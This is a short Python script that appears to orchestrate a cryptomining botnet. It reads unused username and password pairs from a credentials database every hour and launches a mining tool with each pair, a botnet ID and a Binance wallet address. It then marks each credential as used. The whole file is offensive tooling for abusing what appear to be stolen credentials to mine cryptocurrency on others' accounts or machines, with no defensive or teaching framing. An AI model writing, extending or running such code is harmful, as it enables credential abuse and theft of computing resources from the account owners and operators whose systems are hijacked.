import sqlite3
import time
import os
import subprocess

BOTNET_ID = os.environ.get('BOTNET_ID', 'default')
WALLET_ADDRESS = os.environ.get('BINANCE_WALLET_ADDRESS')
MINING_THREADS = 8

def monitor_credentials():
    while True:
        conn = sqlite3.connect('/app/database/credentials.db')
        cursor = conn.cursor()
        cursor.execute("SELECT username, password FROM credentials WHERE used=0")
        credentials = cursor.fetchall()
        conn.close()
        
        for username, password in credentials:
            cmd = [
                'mining-tool',
                '--botnet', BOTNET_ID,
                '--wallet', WALLET_ADDRESS,
                '--username', username,
                '--password', password,
                '--threads', str(MINING_THREADS)
            ]
            
            subprocess.Popen(cmd)
            
            conn = sqlite3.connect('/app/database/credentials.db')
            conn.execute("UPDATE credentials SET used=1 WHERE username=? AND password=?", 
                         (username, password))
            conn.commit()
            conn.close()
        
        time.sleep(3600)

if __name__ == '__main__':
    monitor_credentials()
